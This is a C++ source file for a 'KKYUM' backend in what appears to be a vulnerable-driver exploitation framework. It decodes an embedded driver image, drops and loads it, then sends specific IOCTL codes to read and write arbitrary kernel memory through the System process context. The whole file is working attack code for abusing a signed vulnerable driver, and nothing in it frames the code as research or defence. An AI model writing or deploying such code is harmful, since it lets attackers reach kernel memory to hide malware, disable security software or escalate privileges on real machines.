#include "KKYUMBackend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "KKYUM_sys.h"

namespace
{
	constexpr DWORD KkyumReadIoctl = 0x22265C;
	constexpr DWORD KkyumWriteIoctl = 0x222658;
	constexpr uint32_t SystemProcessId = 4;
}

std::string KKYUMBackend::Name( ) const
{
	return "KKYUM";
}

NTSTATUS KKYUMBackend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( KKYUM_sys, sizeof( KKYUM_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\KKYUM" ), image.data( ), image.size( ), &m_Device, 0x9180 );
}

NTSTATUS KKYUMBackend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( );
}

bool KKYUMBackend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = CopyKernelMemory( KkyumReadIoctl, address, buffer, size );

	if ( !result )
		LOG_SEC( "[-] - [KKYUM] ReadMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool KKYUMBackend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = CopyKernelMemory( KkyumWriteIoctl, address, const_cast<void*>( buffer ), size );

	if ( !result )
		LOG_SEC( "[-] - [KKYUM] WriteMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool KKYUMBackend::CopyKernelMemory( DWORD ioctl, uint64_t address, void* buffer, size_t size )
{
	if ( !address || !buffer || !size || m_Device == INVALID_HANDLE_VALUE )
		return false;

	CopyRequest request {};
	request.TargetPID = SystemProcessId;
	request.EntryCount = 1;
	request.Entries[ 0 ].RemoteAddress = address;
	request.Entries[ 0 ].LocalAddress = r_cast<uint64_t>( buffer );
	request.Entries[ 0 ].Size = size;

	DWORD bytesReturned = 0;
	const auto result = DeviceIoControl( m_Device, ioctl, &request, sizeof( request ), nullptr, 0, &bytesReturned, nullptr ) != FALSE;

	if ( !result )
		return false;

	return true;
}
